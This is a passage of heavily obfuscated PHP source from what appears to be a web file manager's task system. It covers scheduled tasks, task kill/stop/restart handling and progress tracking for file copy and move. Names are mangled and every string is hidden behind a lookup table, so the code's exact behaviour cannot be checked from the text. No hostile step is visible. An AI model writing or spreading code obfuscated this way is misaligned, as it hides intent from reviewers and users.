$ŸŠºî¢Æ[$´øÑ«¥[1553]]); Model($´øÑ«¥[1934])->run($ŸŠºî¢Æ[$´øÑ«¥[487]]); $‚¿‹ŠŒ° = timeFloat(); $â™“†¤  = $´øÑ«¥[12]; switch ($ŸŠºî¢Æ[$´øÑ«¥[33]]) { case $´øÑ«¥[382]: $¢«â›öæ = url_request($ŸŠºî¢Æ[$´øÑ«¥[1553]], $´øÑ«¥[1595], !1, !1, !1, !1, 10); if ($¢«â›öæ[$´øÑ«¥[841]]) { $â™“†¤  = strlen($¢«â›öæ[$´øÑ«¥[1381]]); } break; case $´øÑ«¥[1953]: $â™“†¤  = Hook::apply($ŸŠºî¢Æ[$´øÑ«¥[1553]]); default: break; } Model($´øÑ«¥[1954])->add(array($´øÑ«¥[1955] => $´øÑ«¥[12], $´øÑ«¥[1956] => $´øÑ«¥[228], $´øÑ«¥[33] => $´øÑ«¥[1957] . $ŸŠºî¢Æ[$´øÑ«¥[487]], $´øÑ«¥[1958] => json_encode(array($´øÑ«¥[32] => $ŸŠºî¢Æ[$´øÑ«¥[32]], $´øÑ«¥[1959] => timeFloat() - $‚¿‹ŠŒ°, $´øÑ«¥[847] => $â™“†¤ )))); $«»ÁìÊâ = $â™“†¤  ? $´øÑ«¥[1960] . $â™“†¤  : $´øÑ«¥[12]; self::log($´øÑ«¥[1961] . $ŸŠºî¢Æ[$´øÑ«¥[487]] . $´øÑ«¥[175] . $«»ÁìÊâ); return !0; } public static function valueGet($óÜßæÅ½) { $Æ•Şáô =& $_SERVER[¹Éµ„ºå]; $Ì¤ÛÊŞ„ = $Æ•Şáô[1962]; $ĞûÖÀŠ = Model($Æ•Şáô[522])->get($óÜßæÅ½, $Ì¤ÛÊŞ„); if (is_null($ĞûÖÀŠ)) { Model($Æ•Şáô[522])->set($Æ•Şáô[841], $Æ•Şáô[91], $Ì¤ÛÊŞ„); Model($Æ•Şáô[522])->set($Æ•Şáô[930], $Æ•Şáô[228], $Ì¤ÛÊŞ„); $ĞûÖÀŠ = Model($Æ•Şáô[522])->get($óÜßæÅ½, $Ì¤ÛÊŞ„); } return $ĞûÖÀŠ; } private static function valueSet($Í°¦˜¶Ó, $¶ë‚üıû = false) { $×óÌ©ĞŸ =& $_SERVER[¹Éµ„ºå]; $ò×£Ùã = $×óÌ©ĞŸ[1963]; CacheLock::lock($ò×£Ùã); $µÖ‡öé = Model($×óÌ©ĞŸ[522])->set($Í°¦˜¶Ó, $¶ë‚üıû, $×óÌ©ĞŸ[1962]); CacheLock::unlock($ò×£Ùã); return $µÖ‡öé; } protected static function log($…ÒàÑÜÑ) { write_log($…ÒàÑÜÑ, $_SERVER[¹Éµ„ºå][1949]); } private static function cacheClear() { $§Œóˆ° =& $_SERVER[¹Éµ„ºå]; Cache::clearMemory(Model($§Œóˆ°[522])->cacheKey($§Œóˆ°[1962])); Cache::clearMemory(Model($§Œóˆ°[522])->cacheKey($§Œóˆ°[1964])); Model($§Œóˆ°[1934])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\163\164\x6f\x70"; const STATYS_RUNNING = "\x72\x75\x6e\x6e\151\156\x67"; const STATYS_KILL = "\x6b\x69\154\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($ÁúåÅ„è, $ß¶Á¾„é = '', $¦©Ïîí  = 0, $šÃ›Ø¦í = '') { $ıôÚµøÌ =& $_SERVER[¹Éµ„ºå]; if (self::get($ÁúåÅ„è)) { return; } $this->task = array($ıôÚµøÌ[487] => $ÁúåÅ„è, $ıôÚµøÌ[1582] => USER_ID, $ıôÚµøÌ[1854] => $šÃ›Ø¦í, $ıôÚµøÌ[540] => $ıôÚµøÌ[12], $ıôÚµøÌ[33] => $ß¶Á¾„é, $ıôÚµøÌ[1223] => $ıôÚµøÌ[12], $ıôÚµøÌ[1221] => $¦©Ïîí , $ıôÚµøÌ[1965] => 0, $ıôÚµøÌ[1966] => 0, $ıôÚµøÌ[1967] => 0, $ıôÚµøÌ[1968] => timeFloat(), $ıôÚµøÌ[1969] => 0, $ıôÚµøÌ[1970] => 0, $ıôÚµøÌ[1971] => 0, $ıôÚµøÌ[1972] => 0, $ıôÚµøÌ[841] => $ıôÚµøÌ[930]); $GLOBALS[$ıôÚµøÌ[1973]] = 1; Hook::bind($ıôÚµøÌ[1919], array($this, $ıôÚµøÌ[1974])); Hook::bind($ıôÚµøÌ[1975], array($this, $ıôÚµøÌ[1976])); $this->startAfter(); Hook::trigger($ıôÚµøÌ[1977], $this->task); $this->task[$ıôÚµøÌ[1970]] = timeFloat(); } public function end($µÉ¯ğ¾è = '') { $ç¥îà•è =& $_SERVER[¹Éµ„ºå]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$ç¥îà•è[1970]]) { self::valueSet($this->task[$ç¥îà•è[487]], !1); } $this->isEnd = !0; if ($µÉ¯ğ¾è) { $this->task[$ç¥îà•è[540]] = $µÉ¯ğ¾è; } self::log($ç¥îà•è[1978] . $this->task[$ç¥îà•è[487]] . $ç¥îà•è[1979] . sprintf($ç¥îà•è[999], timeFloat() - $this->task[$ç¥îà•è[1968]]) . $ç¥îà•è[1980]); Hook::unbind($ç¥îà•è[1919], array($this, $ç¥îà•è[1974])); Hook::unbind($ç¥îà•è[1975], array($this, $ç¥îà•è[1976])); $this->endAfter(); $¼á½³ = $this->task; $this->task = !1; Hook::trigger($ç¥îà•è[1981], $¼á½³); } public function update($ì¾ãâŒé = 0, $¹£„¹÷Ì = false) { $¨ÕïìÜ¦ =& $_SERVER[¹Éµ„ºå]; $Æ©ïšëÒ =& $this->task; if (!$Æ©ïšëÒ) { return; } $Æ©ïšëÒ[$¨ÕïìÜ¦[1965]] += $ì¾ãâŒé; $Æ©ïšëÒ[$¨ÕïìÜ¦[1969]] = timeFloat(); if ($Æ©ïšëÒ[$¨ÕïìÜ¦[1221]]) { if ($Æ©ïšëÒ[$¨ÕïìÜ¦[1221]] < $Æ©ïšëÒ[$¨ÕïìÜ¦[1965]]) { $Æ©ïšëÒ[$¨ÕïìÜ¦[1221]] = $Æ©ïšëÒ[$¨ÕïìÜ¦[1965]]; } $ÎÏÏ·ª = timeFloat() - $Æ©ïšëÒ[$¨ÕïìÜ¦[1968]] - $Æ©ïšëÒ[$¨ÕïìÜ¦[1971]]; if ($ÎÏÏ·ª <= 0) { $ÎÏÏ·ª = 0.001; } $Æ©ïšëÒ[$¨ÕïìÜ¦[1966]] = $Æ©ïšëÒ[$¨ÕïìÜ¦[1965]] / $Æ©ïšëÒ[$¨ÕïìÜ¦[1221]]; $Æ©ïšëÒ[$¨ÕïìÜ¦[1967]] = $Æ©ïšëÒ[$¨ÕïìÜ¦[1965]] / $ÎÏÏ·ª; if ($Æ©ïšëÒ[$¨ÕïìÜ¦[1966]] > 0) { $Æ©ïšëÒ[$¨ÕïìÜ¦[1972]] = $ÎÏÏ·ª * (1 - $Æ©ïšëÒ[$¨ÕïìÜ¦[1966]]) / $Æ©ïšëÒ[$¨ÕïìÜ¦[1966]]; } $Æ©ïšëÒ[$¨ÕïìÜ¦[1972]] = $Æ©ïšëÒ[$¨ÕïìÜ¦[1972]] <= 0 ? 0 : $Æ©ïšëÒ[$¨ÕïìÜ¦[1972]]; } $this->updateAfter(); $û±âŞÀ› = 0.2; if (timeFloat() - $Æ©ïšëÒ[$¨ÕïìÜ¦[1970]] < $û±âŞÀ› && !$¹£„¹÷Ì) { return; } $¥İõ¹Õ¼ = self::get($Æ©ïšëÒ[$¨ÕïìÜ¦[487]]); $¿•¬Ô = $¥İõ¹Õ¼[$¨ÕïìÜ¦[841]]; if ($¿•¬Ô == self::STATYS_KILL) { $Ãó…õÚ = array($¨ÕïìÜ¦[1982] => LNG($¨ÕïìÜ¦[1983]), $¨ÕïìÜ¦[1391] => !1); Cache::set($¨ÕïìÜ¦[1984] . $this->task[$¨ÕïìÜ¦[487]], $Ãó…õÚ, 30); $this->onKill(); $this->end(); die; } else { if ($¿•¬Ô == self::STATYS_STOP) { $Îöø¦‹¾ = 2; $¥İõ¹Õ¼[$¨ÕïìÜ¦[1971]] += $Îöø¦‹¾; self::valueSet($Æ©ïšëÒ[$¨ÕïìÜ¦[487]], $¥İõ¹Õ¼); sleep($Îöø¦‹¾); $this->update(); return; } } $Æ©ïšëÒ[$¨ÕïìÜ¦[841]] = $¿•¬Ô ? $¿•¬Ô : $Æ©ïšëÒ[$¨ÕïìÜ¦[841]]; $Æ©ïšëÒ[$¨ÕïìÜ¦[1971]] = $¥İõ¹Õ¼[$¨ÕïìÜ¦[1971]] ? $¥İõ¹Õ¼[$¨ÕïìÜ¦[1971]] : 0; $Æ©ïšëÒ[$¨ÕïìÜ¦[1970]] = timeFloat(); Hook::trigger($¨ÕïìÜ¦[1985], $Æ©ïšëÒ); self::valueSet($Æ©ïšëÒ[$¨ÕïìÜ¦[487]], $Æ©ïšëÒ); } public function onKillSet($¸ú—¾—ì, $Ëßö˜Â² = array()) { $this->onKillCall = array($¸ú—¾—ì, $Ëßö˜Â²); } public function onKill() { $èŒ­ÚÏç =& $_SERVER[¹Éµ„ºå]; self::log($èŒ­ÚÏç[1978] . $this->task[$èŒ­ÚÏç[487]] . $èŒ­ÚÏç[1986]); Hook::trigger($èŒ­ÚÏç[1987], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($À½¸) { $Ü…Ö°Ğ‰ =& $_SERVER[¹Éµ„ºå]; Cache::set($Ü…Ö°Ğ‰[1984] . $this->task[$Ü…Ö°Ğ‰[487]], $À½¸, 60); if (!is_array($À½¸) || !$À½¸[$Ü…Ö°Ğ‰[1391]]) { self::log($Ü…Ö°Ğ‰[1988] . json_encode($À½¸)); } return $À½¸; } public static function get($Æ«ßé¢) { $âõ¯•©€ =& $_SERVER[¹Éµ„ºå]; $çû©üò = self::valueGet($Æ«ßé¢); if (is_array($çû©üò) && $çû©üò[$âõ¯•©€[1989]]) { $€³´¦¹Ã = ActionApply($çû©üò[$âõ¯•©€[1989]], array($çû©üò)); $çû©üò = is_array($€³´¦¹Ã) ? $€³´¦¹Ã : $çû©üò; } return $çû©üò; } public static function listData() { $àÖù¡×€ = self::valueGet(); return array_sort_by($àÖù¡×€, $_SERVER[¹Éµ„ºå][1968], !0); } public static function kill($ÜŠÁŒÖ¸) { return self::changeStatus($ÜŠÁŒÖ¸, self::STATYS_KILL); } public static function stop($šê—·Îš) { return self::changeStatus($šê—·Îš, self::STATYS_STOP); } public static function restart($¤æƒÑ†ñ) { return self::changeStatus($¤æƒÑ†ñ, self::STATYS_RUNNING); } public static function killAll() { $†´ş¦ô† =& $_SERVER[¹Éµ„ºå]; $½±¯ºú• = self::listData(); foreach ($½±¯ºú• as $ÚÂºÆ‹Ñ) { self::kill($ÚÂºÆ‹Ñ[$†´ş¦ô†[487]]); } sleep(2); foreach ($½±¯ºú• as $ÚÂºÆ‹Ñ) { self::valueSet($ÚÂºÆ‹Ñ[$†´ş¦ô†[487]], !1); } } private static function changeStatus($‘í§¤², $Ğ‚ºÌ÷¯) { $õ¿¨ø‡Ñ =& $_SERVER[¹Éµ„ºå]; $–•¿ÂÄ½ = self::valueGet($‘í§¤²); if (!$–•¿ÂÄ½) { return !1; } $–•¿ÂÄ½[$õ¿¨ø‡Ñ[841]] = $Ğ‚ºÌ÷¯; self::valueSet($‘í§¤², $–•¿ÂÄ½); self::log($õ¿¨ø‡Ñ[1990] . $–•¿ÂÄ½[$õ¿¨ø‡Ñ[487]] . $õ¿¨ø‡Ñ[1991] . $Ğ‚ºÌ÷¯); return !0; } public static function valueGet($¯©Á×™• = false) { $åÅ˜ =& $_SERVER[¹Éµ„ºå]; if ($¯©Á×™•) { $Ğ´¸—çÆ = Model($åÅ˜[534])->where(array($åÅ˜[95] => $¯©Á×™•, $åÅ˜[33] => $åÅ˜[1230]))->find(); return $Ğ´¸—çÆ ? json_decode($Ğ´¸—çÆ[$åÅ˜[451]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($–”Ç†¸İ = false) { $–Üùæ±ü =& $_SERVER[¹Éµ„ºå]; $ı§‹—Ï° = array($–Üùæ±ü[33] => $–Üùæ±ü[1230]); if ($–”Ç†¸İ) { $ı§‹—Ï°[$–Üùæ±ü[1582]] = $–”Ç†¸İ; } $µú»âäø = Model($–Üùæ±ü[534])->where($ı§‹—Ï°)->select(); $µú»âäø = $µú»âäø ? $µú»âäø : array(); foreach ($µú»âäø as $ÔŸÁ“Š => $óú¶’Èü) { $µú»âäø[$ÔŸÁ“Š] = json_decode($óú¶’Èü[$–Üùæ±ü[451]], !0); } return $µú»âäø; } public static function valueSet($¸ùß»Ä, $˜¬½¿éó) { $÷Û¶›¸¤ =& $_SERVER[¹Éµ„ºå]; if (!$˜¬½¿éó) { return Model($÷Û¶›¸¤[534])->where(array($÷Û¶›¸¤[95] => $¸ùß»Ä, $÷Û¶›¸¤[33] => $÷Û¶›¸¤[1230]))->delete(); } $óÖæÊ©Î = json_encode($˜¬½¿éó); if (!$óÖæÊ©Î) { ob_start(); var_dump($˜¬½¿éó); $¹ÊÌœúš = ob_get_clean(); self::log($÷Û¶›¸¤[1992] . json_encode_force($¹ÊÌœúš)); } if (!$¸ùß»Ä || !$˜¬½¿éó[$÷Û¶›¸¤[487]]) { return !1; } $ŠÓê§¿õ = array($÷Û¶›¸¤[33] => $÷Û¶›¸¤[1230], $÷Û¶›¸¤[1582] => USER_ID, $÷Û¶›¸¤[95] => $¸ùß»Ä, $÷Û¶›¸¤[451] => $óÖæÊ©Î); $èìùïìğ = $÷Û¶›¸¤[1993]; CacheLock::lock($èìùïìğ); Model($÷Û¶›¸¤[534])->add($ŠÓê§¿õ, array(), !0); CacheLock::unlock($èìùïìğ); } public static function log($ÁæÇ¹´‘) { if (!GLOBAL_DEBUG) { return; } write_log($ÁæÇ¹´‘, $_SERVER[¹Éµ„ºå][1994]); } } class TaskFileTransfer extends Task { protected function startAfter() { $‘ ’Äµ÷ =& $_SERVER[¹Éµ„ºå]; $¦¸÷õ¡° =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($‘ ’Äµ÷[1995], array($this, $‘ ’Äµ÷[1996])); Hook::bind($‘ ’Äµ÷[1402], array($this, $‘ ’Äµ÷[1997])); Hook::bind($‘ ’Äµ÷[1998], array($this, $‘ ’Äµ÷[1999])); Hook::bind($‘ ’Äµ÷[690], array($this, $‘ ’Äµ÷[2000])); Hook::bind($‘ ’Äµ÷[691], array($this, $‘ ’Äµ÷[2001])); Hook::bind($‘ ’Äµ÷[697], array($this, $‘ ’Äµ÷[2002])); Hook::bind($‘ ’Äµ÷[698], array($this, $‘ ’Äµ÷[2003])); Hook::bind($‘ ’Äµ÷[693], array($this, $‘ ’Äµ÷[2004])); Hook::bind($‘ ’Äµ÷[695], array($this, $‘ ’Äµ÷[2005])); Hook::bind($‘ ’Äµ÷[659], array($this, $‘ ’Äµ÷[2006])); Hook::bind($‘ ’Äµ÷[656], array($this, $‘ ’Äµ÷[2006])); Hook::bind($‘ ’Äµ÷[661], array($this, $‘ ’Äµ÷[2006])); Hook::bind($‘ ’Äµ÷[663], array($this, $‘ ’Äµ÷[2006])); Hook::bind($‘ ’Äµ÷[665], array($this, $‘ ’Äµ÷[2006])); Hook::bind($‘ ’Äµ÷[2007], array($this, $‘ ’Äµ÷[2008])); Hook::bind($‘ ’Äµ÷[681], array($this, $‘ ’Äµ÷[2009])); $this->sourceModelCopyFlag = !1; Hook::bind($‘ ’Äµ÷[2010], array($this, $‘ ’Äµ÷[2011])); Hook::bind($‘ ’Äµ÷[2012], array($this, $‘ ’Äµ÷[2013])); Hook::bind($‘ ’Äµ÷[2014], array($this, $‘ ’Äµ÷[2015])); $¦¸÷õ¡°[$‘ ’Äµ÷[2016]] = LNG($‘ ’Äµ÷[2017]); $¦¸÷õ¡°[$‘ ’Äµ÷[2018]] = 0; $¦¸÷õ¡°[$‘ ’Äµ÷[2019]] = 0; $¦¸÷õ¡°[$‘ ’Äµ÷[1223]] = $‘ ’Äµ÷[12]; $¦¸÷õ¡°[$‘ ’Äµ÷[2020]] = $‘ ’Äµ÷[12]; $¦¸÷õ¡°[$‘ ’Äµ÷[2021]] = 0; $¦¸÷õ¡°[$‘ ’Äµ÷[2022]] = 0; $¦¸÷õ¡°[$‘ ’Äµ÷[932]] = 0; if (!$¦¸÷õ¡°[$‘ ’Äµ÷[1854]]) { $¦¸÷õ¡°[$‘ ’Äµ÷[1854]] = LNG($‘ ’Äµ÷[2023]); } } protected function endAfter() { $œÄ¿§÷Ş =& $_SERVER[¹Éµ„ºå]; Hook::unbind($œÄ¿§÷Ş[1995], array($this, $œÄ¿§÷Ş[1996])); Hook::unbind($œÄ¿§÷Ş[1402], array($this, $œÄ¿§÷Ş[1997])); Hook::unbind($œÄ¿§÷Ş[1998], array($this, $œÄ¿§÷Ş[1999])); Hook::unbind($œÄ¿§÷Ş[690], array($this, $œÄ¿§÷Ş[2000])); Hook::unbind($œÄ¿§÷Ş[691], array($this, $œÄ¿§÷Ş[2001])); Hook::unbind($œÄ¿§÷Ş[697], array($this, $œÄ¿§÷Ş[2002])); Hook::unbind($œÄ¿§÷Ş[698], array($this, $œÄ¿§÷Ş[2003])); Hook::unbind($œÄ¿§÷Ş[693], array($this, $œÄ¿§÷Ş[2004])); Hook::unbind($œÄ¿§÷Ş[695], array($this, $œÄ¿§÷Ş[2005])); Hook::unbind($œÄ¿§÷Ş[659], array($this, $œÄ¿§÷Ş[2006])); Hook::unbind($œÄ¿§÷Ş[656], array($this, $œÄ¿§÷Ş[2006])); Hook::unbind($œÄ¿§÷Ş[661], array($this, $œÄ¿§÷Ş[2006])); Hook::unbind($œÄ¿§÷Ş[663], array($this, $œÄ¿§÷Ş[2006])); Hook::unbind($œÄ¿§÷Ş[665], array($this, $œÄ¿§÷Ş[2006])); Hook::unbind($œÄ¿§÷Ş[2007], array($this, $œÄ¿§÷Ş[2008])); Hook::unbind($œÄ¿§÷Ş[681], array($this, $œÄ¿§÷Ş[2009])); Hook::unbind($œÄ¿§÷Ş[2010], array($this, $œÄ¿§÷Ş[2011])); Hook::unbind($œÄ¿§÷Ş[2012], array($this, $œÄ¿§÷Ş[2013])); Hook::unbind($œÄ¿§÷Ş[2014], array($this, $œÄ¿§÷Ş[2015])); } public function copyMoveStart($Á÷«ª£·, $áã·ğµæ, $ÖİéÇÉ, $Úåõ€‘å) { $Æ¨î¢”í =& $_SERVER[¹Éµ„ºå]; self::log($Æ¨î¢”í[2024] . $áã·ğµæ . $Æ¨î¢”í[73] . $Úåõ€‘å); $¢üƒğÅ = rtrim(TEMP_FILES, $Æ¨î¢”í[8]); if (substr($áã·ğµæ, 0, strlen($¢üƒğÅ)) == $¢üƒğÅ) { return; } if (substr($Úåõ€‘å, 0, strlen($¢üƒğÅ)) == $¢üƒğÅ) { return; } $Óßß™± =& $this->task; $Óßß™±[$Æ¨î¢”í[2025]] = KodIO::transferType($Á÷«ª£·, $ÖİéÇÉ); self::log($Æ¨î¢”í[2026] . $Óßß™±[$Æ¨î¢”í[2025]] . $Æ¨î¢”í[74] . $áã·ğµæ . $Æ¨î¢”í[73] . $Úåõ€‘å); $this->update(); } public function updateAfter() { $£×à§ı¯ =& $_SERVER[¹Éµ„ºå]; $÷ÕÇ¦ÅÂ =& $this->task; if (!$÷ÕÇ¦ÅÂ[$£×à§ı¯[855]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($÷ÕÇ¦ÅÂ[$£×à§ı¯[2025]] == $£×à§ı¯[1503]) { return; } self::updateTask($÷ÕÇ¦ÅÂ); } private static function updateTask(&$±·™Öñï) { $Á©„Ó†¹ =& $_SERVER[¹Éµ„ºå]; if ($±·™Öñï[$Á©„Ó†¹[2025]] == $Á©„Ó†¹[1374] || $±·™Öñï[$Á©„Ó†¹[2025]] == $Á©„Ó†¹[107]) { if ($±·™Öñï[$Á©„Ó†¹[2020]]) { $±·™Öñï[$Á©„Ó†¹[932]] = $±·™Öñï[$Á©„Ó†¹[2022]] + $±·™Öñï[$Á©„Ó†¹[2019]]; } } else { if ($±·™Öñï[$Á©„Ó†¹[2025]] == $Á©„Ó†¹[1504]) { if ($±·™Öñï[$Á©„Ó†¹[2020]] == $Á©„Ó†¹[1374]) { $±·™Öñï[$Á©„Ó†¹[932]] = $±·™Öñï[$Á©„Ó†¹[2022]] + $±·™Öñï[$Á©„Ó†¹[2019]] * 0.5; } else { if ($±·™Öñï[$Á©„Ó†¹[2020]] == $Á©„Ó†¹[107]) { $±·™Öñï[$Á©„Ó†¹[932]] = $±·™Öñï[$Á©„Ó†¹[2022]] + $±·™Öñï[$Á©„Ó†¹[2018]] * 0.5 + $±·™Öñï[$Á©„Ó†¹[2019]] * 0.5; } } } } $±·™Öñï[$Á©„Ó†¹[1966]] = $±·™Öñï[$Á©„Ó†¹[932]] / $±·™Öñï[$Á©„Ó†¹[855]]; if ($±·™Öñï[$Á©„Ó†¹[1966]] > 0) { $¶Ò£µ… = timeFloat() - $±·™Öñï[$Á©„Ó†¹[1968]] - $±·™Öñï[$Á©„Ó†¹[1971]]; $±·™Öñï[$Á©„Ó†¹[1972]] = $¶Ò£µ… * (1 - $±·™Öñï[$Á©„Ó†¹[1966]]) / $±·™Öñï[$Á©„Ó†¹[1966]]; } $ü·áÓ£ = $±·™Öñï[$Á©„Ó†¹[2019]] . $Á©„Ó†¹[983] . $±·™Öñï[$Á©„Ó†¹[2018]] . "\x3b\x20{$‡–ıš°Æ}\x3b" . $±·™Öñï[$Á©„Ó†¹[932]]; self::log($Á©„Ó†¹[2027] . $±·™Öñï[$Á©„Ó†¹[2020]] . $Á©„Ó†¹[74] . $±·™Öñï[$Á©„Ó†¹[1966]] . $Á©„Ó†¹[74] . $ü·áÓ£); } public function addPath($ÏÕ€ºà‡) { $ùûû¤§ª =& $_SERVER[¹Éµ„ºå]; if (!$ÏÕ€ºà‡) { return; } $’Æ«÷¬ =& $this->task; $ÑÂÏí±³ = IO::infoWithChildren($ÏÕ€ºà‡); $²ÛÕĞ½Ä = $’Æ«÷¬[$ùûû¤§ª[2028]] ? $’Æ«÷¬[$ùûû¤§ª[2028]][$ùûû¤§ª[2029]] : 0; $’Æ«÷¬[$ùûû¤§ª[2028]] = array($ùûû¤§ª[2029] => $²ÛÕĞ½Ä + 1, $ùûû¤§ª[509] => $ÑÂÏí±³[$ùûû¤§ª[32]], $ùûû¤§ª[87] => $ÑÂÏí±³[$ùûû¤§ª[87]], $ùûû¤§ª[602] => $ÑÂÏí±³[$ùûû¤§ª[602]] ? $ÑÂÏí±³[$ùûû¤§ª[602]] : $ÑÂÏí±³[$ùûû¤§ª[87]]); if ($ÑÂÏí±³[$ùûû¤§ª[33]] == $ùûû¤§ª[230]) { $’Æ«÷¬[$ùûû¤§ª[1221]] += 1; } else { $’Æ«÷¬[$ùûû¤§ª[1221]] += $ÑÂÏí±³[$ùûû¤§ª[82]][$ùûû¤§ª[80]]; if ($ÑÂÏí±³[$ùûû¤§ª[191]]) { $’Æ«÷¬[$ùûû¤§ª[1221]] += $ÑÂÏí±³[$ùûû¤§ª[82]][$ùûû¤§ª[81]] + 1; } } $’Æ«÷¬[$ùûû¤§ª[855]] += $ÑÂÏí±³[$ùûû¤§ª[79]]; $this->update(); self::log(array($ùûû¤§ª[2030] . $ÏÕ€ºà‡, $ÑÂÏí±³)); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($ï¡²º·‰) { } public function sourceAddHashEnd($çèİ¸™±) { } public function sourceAddFileStart($Ó‹İË«§) { $ÇÈÛÕ€ò =& $_SERVER[¹Éµ„ºå]; $ü†áÄÜÀ =& $this->task; $ü†áÄÜÀ[$ÇÈÛÕ€ò[2018]] = $Ó‹İË«§[$ÇÈÛÕ€ò[79]]; $ü†áÄÜÀ[$ÇÈÛÕ€ò[2016]] = $Ó‹İË«§[$ÇÈÛÕ€ò[32]]; $ü†áÄÜÀ[$ÇÈÛÕ€ò[1223]] = $Ó‹İË«§[$ÇÈÛÕ€ò[32]]; $ü†áÄÜÀ[$ÇÈÛÕ€ò[2031]] = $Ó‹İË«§[$ÇÈÛÕ€ò[87]]; $this->update(); self::log($ÇÈÛÕ€ò[2032] . $Ó‹İË«§[$ÇÈÛÕ€ò[87]] . $ÇÈÛÕ€ò[2033] . $Ó‹İË«§[$ÇÈÛÕ€ò[79]]); } public function sourceAddFileEnd($ã“Â¸™¥) { $›ìşµÜ =& $_SERVER[¹Éµ„ºå]; $ê”çÂ— =& $this->task; $ê”çÂ—[$›ìşµÜ[932]] += $ã“Â¸™¥[$›ìşµÜ[79]]; $ê”çÂ—[$›ìşµÜ[2031]] = $ã“Â¸™¥[$›ìşµÜ[87]]; $this->update(1); self::log($›ìşµÜ[2034] . $ã“Â¸™¥[$›ìşµÜ[87]] . $›ìşµÜ[2033] . $ã“Â¸™¥[$›ìşµÜ[79]] . $›ìşµÜ[2035]); } public function copyFileStart($’µ³å¶À, $»“”¥Øæ, $áˆĞÏ¥Ø, $É²êÕåá, $Õù÷‰è¬, $Úå·òÃ) { $Ù¹Âƒüµ =& $_SERVER[¹Éµ„ºå]; $§›½Ì³£ = $Õù÷‰è¬; if ($§›½Ì³£ == $GLOBALS[$Ù¹Âƒüµ[2036]]) { $§›½Ì³£ = $GLOBALS[$Ù¹Âƒüµ[2037]]; } $GLOBALS[$Ù¹Âƒüµ[2037]] = $Õù÷‰è¬; $GLOBALS[$Ù¹Âƒüµ[2036]] = $Úå·òÃ; $£üÕˆ©ù =& $this->task; $£üÕˆ©ù[$Ù¹Âƒüµ[2016]] = $§›½Ì³£; $£üÕˆ©ù[$Ù¹Âƒüµ[2018]] = (int) $’µ³å¶À->size($»“”¥Øæ); $£üÕˆ©ù[$Ù¹Âƒüµ[2019]] = 0; $£üÕˆ©ù[$Ù¹Âƒüµ[1223]] = $Ù¹Âƒüµ[12]; $£üÕˆ©ù[$Ù¹Âƒüµ[2020]] = $Ù¹Âƒüµ[12]; $£üÕˆ©ù[$Ù¹Âƒüµ[2021]] = 0; $¹–›Ñ€¥ = $£üÕˆ©ù[$Ù¹Âƒüµ[2018]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($£üÕˆ©ù[$Ù¹Âƒüµ[487]] . $Ù¹Âƒüµ[2038]); if ($¹–›Ñ€¥ && file_exists(get_path_father($É²êÕåá))) { Cache::set($£üÕˆ©ù[$Ù¹Âƒüµ[487]] . $Ù¹Âƒüµ[2038], $É²êÕåá); $£üÕˆ©ù[$Ù¹Âƒüµ[1989]] = array($Ù¹Âƒüµ[2039], $Ù¹Âƒüµ[2040]); } $this->update(0, $¹–›Ñ€¥); self::log("\143\x6f\x70\171\106\x69\x6c\x65\x53\164\141\162\164\72{$»“”¥Øæ}\x3b"); } public static function updateCopyLocalFileSize($ù««¾ïı) { $òÆšğÖŞ =& $_SERVER[¹Éµ„ºå]; $¡ö·ªĞã = Cache::get($ù««¾ïı[$òÆšğÖŞ[487]] . $òÆšğÖŞ[2038]); if (!$¡ö·ªĞã || !file_exists($¡ö·ªĞã)) { return $ù««¾ïı; } $ù««¾ïı[$òÆšğÖŞ[2019]] = @filesize($¡ö·ªĞã); $ù««¾ïı[$òÆšğÖŞ[932]] += $ù««¾ïı[$òÆšğÖŞ[2019]]; self::updateTask($ù««¾ïı); return $ù««¾ïı; } public function copyFileEnd($È¾úÑ£ş, $õÅ¾Ş¬¿, $Œö¹®ã¶, $’°ÆıÅç, $ğ¸‹¼ö, $ù½î ¹) { $È†»Ğ“™ =& $_SERVER[¹Éµ„ºå]; $å–€Ùé© =& $this->task; $å–€Ùé©[$È†»Ğ“™[2019]] = $å–€Ùé©[$È†»Ğ“™[2018]]; $å–€Ùé©[$È†»Ğ“™[2020]] = $È†»Ğ“™[12]; unset($å–€Ùé©[$È†»Ğ“™[1989]]); if ($ğ¸‹¼ö == $å–€Ùé©[$È†»Ğ“™[2016]]) { $å–€Ùé©[$È†»Ğ“™[2022]] += $å–€Ùé©[$È†»Ğ“™[2018]]; $å–€Ùé©[$È†»Ğ“™[932]] = $å–€Ùé©[$È†»Ğ“™[2022]]; $¨¡Äœ× = 1; if (isset($å–€Ùé©[$È†»Ğ“™[2031]]) && $å–€Ùé©[$È†»Ğ“™[2031]] == $õÅ¾Ş¬¿) { $¨¡Äœ× = 0; } $this->update($¨¡Äœ×); } else { $this->update(); $å–€Ùé©[$È†»Ğ“™[2019]] = 0; } Cache::remove($å–€Ùé©[$È†»Ğ“™[487]] . $È†»Ğ“™[2038]); self::log($È†»Ğ“™[2041] . $õÅ¾Ş¬¿ . $È†»Ğ“™[73] . $’°ÆıÅç . $È†»Ğ“™[285] . $ğ¸‹¼ö . $È†»Ğ“™[2042] . $å–€Ùé©[$È†»Ğ“™[2016]]); } public function updateFileEnd($‡ß³şÑù, $Ì¬Ø¥Ğ¤) { $ÄúÓóÛ¢ =& $_SERVER[¹Éµ„ºå]; $ÕÍÌ·¦½ =& $this->task; $ÕÍÌ·¦½[$ÄúÓóÛ¢[2016]] = $‡ß³şÑù; $ÕÍÌ·¦½[$ÄúÓóÛ¢[2018]] = $Ì¬Ø¥Ğ¤; $ÕÍÌ·¦½[$ÄúÓóÛ¢[2022]] += $Ì¬Ø¥Ğ¤; $ÕÍÌ·¦½[$ÄúÓóÛ¢[932]] = $ÕÍÌ·¦½[$ÄúÓóÛ¢[2022]]; $this->update(1); self::log($ÄúÓóÛ¢[2043] . $‡ß³şÑù); } 